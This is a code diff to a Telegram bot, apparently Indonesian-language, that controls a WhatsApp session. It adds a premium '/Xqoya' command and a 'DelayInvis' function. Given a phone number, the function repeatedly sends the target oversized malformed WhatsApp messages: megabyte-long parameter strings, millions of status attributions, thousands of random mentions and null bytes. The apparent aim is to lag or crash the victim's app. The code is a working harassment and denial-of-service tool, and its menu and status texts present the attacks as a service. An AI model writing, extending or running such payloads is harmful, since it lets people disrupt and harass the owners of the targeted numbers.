@@ -1333,6 +1333,7 @@ async function showxbugs(ctx, page = 1) {
 <blockquote>☾. ⬡═―⊱「 🚀 DELAY TYPE 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
 ◇ /Xdelay   62xxx  → Delay Hard Visible
 ◇ /Xbug    62xxx  → Invisible Delay
+◇ /Xqoya   62xxx  → Delay Bebas Spam
 
 <blockquote>ִֶָ࣪☾. ( ! ) 𝚂𝚎𝚕𝚕𝚎𝚌𝚝 𝚃𝚑𝚎 𝙼𝚎𝚗𝚞 𝙱𝚞𝚝𝚝𝚘𝚗 𝙱𝚎𝚕𝚘𝚠 ࣪ ִֶָ☾.</blockquote>
 `;
@@ -2294,7 +2295,7 @@ bot.command("Xbug", checkAllPremium, checkWhatsAppConnection, checkCooldown, asy
 `<pre>🛡️ 𝐗𝐛𝐮𝐠𝐬 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠
  ━━━━━━━━━━━━━━━
 ◇ 📤 Target : ${q}
-◇ 🦋 Type : Delay Invisible Spam
+◇ 🦋 Type : DILEY LOW
 ◇ ⚡ Status : Success✅
 ◇ 🚀 Process : Berhasil Yeay✅</pre>`,
     { parse_mode: "HTML" }
@@ -2304,6 +2305,32 @@ bot.command("Xbug", checkAllPremium, checkWhatsAppConnection, checkCooldown, asy
     for (let i = 0; i < 20; i++) {
       await PaysQl(sock, target);
       await sleep(1500);
+    }
+  })();
+});
+/// ============= CASE BUG 3 BEBAS SPAM=============\\\
+bot.command("Xqoya", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
+
+  const q = ctx.message.text.split(" ")[1]; 
+  if (!q) return ctx.reply("🪧 ☇ Example : /Xqoya 62xx");
+
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+
+  await ctx.reply(
+`<pre>🛡️ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐀𝐭𝐭𝐚𝐜𝐤 𝐛𝐮𝐠𝐬
+ ━━━━━━━━━━━━━━━
+◇ 📤 Target : ${q}
+◇ 🦋 Type : DELAY BEBAS SPAM
+◇ ☘️ Loop : Sedang Memasak
+◇ ⚙️ Command : Xqoya
+◇ ⚡ Status : Success✅</pre>`,
+    { parse_mode: "HTML" }
+  );
+
+  (async () => {
+    for (let i = 0; i < 20; i++) {
+      await DelayInvis(sock, target);
+      await sleep(2000);
     }
   })();
 });
@@ -2524,6 +2551,72 @@ async function PaysQl(socket, target) {
     )
 
     await sleep(1500)
+  }
+}
+
+async function DelayInvis(sock, target) {
+  const type = ["galaxy_message", "call_permission_request", "address_message", "payment_method", "mpm"];
+  
+  for (let i = 0; i < 20; i++) {
+    for (const x of type) {
+      const enty = Math.floor(Math.random() * type.length);
+      const msg = generateWAMessageFromContent(
+        target,
+        {
+          viewOnceMessage: {
+            message: {
+              interactiveResponseMessage: {
+                body: {
+                  text: "*\u0000",
+                  format: "DEFAULT"
+                },
+                nativeFlowResponseMessage: {
+                  name: x,
+                  paramsJson: "\x10".repeat(1045000),
+                  version: 3
+                },
+                entryPointConversionSource: type[enty],
+                contextInfo: {
+                  statusAttributionType: 2,
+                  statusAttributions: Array.from({ length: 2009990 }, (_, z) => ({
+                    type: 1
+                  })),
+                  mentionedJid: Array.from({ length: 3000 }, () => 
+                    Math.floor(Math.random() * 999999999) + "@s.whatsapp.net"
+                  ),
+                  isForwarded: true,
+                  forwardingScore: 99999,
+                  quotedMessage: {
+                    paymentInviteMessage: {
+                      serviceType: 3,
+                      expiryTimestamp: Date.now() + 1814400000
+                    }
+                  }
+                }
+              }
+            }
+          }
+        },
+        {
+          participant: { jid: target }
+        }
+      );
+      
+      await sock.relayMessage(
+        target,
+        {
+          groupStatusMessageV2: {
+            message: msg.message
+          }
+        },
+        {
+          messageId: msg.key.id,
+          participant: { jid: target }
+        }
+      );
+      
+      await new Promise(resolve => setTimeout(resolve, 3000));
+    }
   }
 }
 
